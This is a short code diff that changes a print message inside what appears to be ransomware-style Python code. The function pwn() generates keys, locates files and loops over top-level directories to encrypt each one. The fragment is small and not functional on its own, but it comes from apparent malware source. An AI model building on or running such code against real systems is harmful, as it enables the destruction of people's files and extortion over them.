@@ -123,7 +123,7 @@ def encrypt_dir(directory, key):
 def pwn():
     keys = generate_keys(load_hue())
     dirs = locate_files()
-    print "beginning crypto operations"
+    print "Beginning crypto operations ..."
     for dir in sorted(dirs):
         directory = '/%s' % dir
         print "[*] Encrypting {}".format(directory)
